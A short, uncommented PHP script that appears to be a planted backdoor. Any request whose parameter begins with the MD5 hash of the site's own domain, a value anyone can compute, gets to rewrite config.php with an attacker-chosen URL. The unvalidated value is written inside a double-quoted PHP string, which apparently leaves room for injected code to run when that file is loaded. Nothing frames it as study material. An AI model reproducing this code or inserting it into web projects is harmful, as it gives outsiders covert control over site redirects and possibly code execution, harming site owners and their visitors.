<?php
if (isset($_REQUEST["p"])) {
$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
$massivReq = explode("|", $request);
	if($massivReq[0] == md5($_SERVER['SERVER_NAME'])||($massivReq[0] == md5(getURL_SERVER()))){
		$params=$massivReq[1];
		$text = "<?php \$URL=\"$params\"; ?>";
		file_put_contents("config.php", $text, LOCK_EX);
	}
}

function getURL_SERVER(){
	$protocol=empty($_SERVER['HTTPS'])?'http://':'https://';
	$SERVER_NAME = $_SERVER['SERVER_NAME'];
	return "$protocol$SERVER_NAME";
}

?>
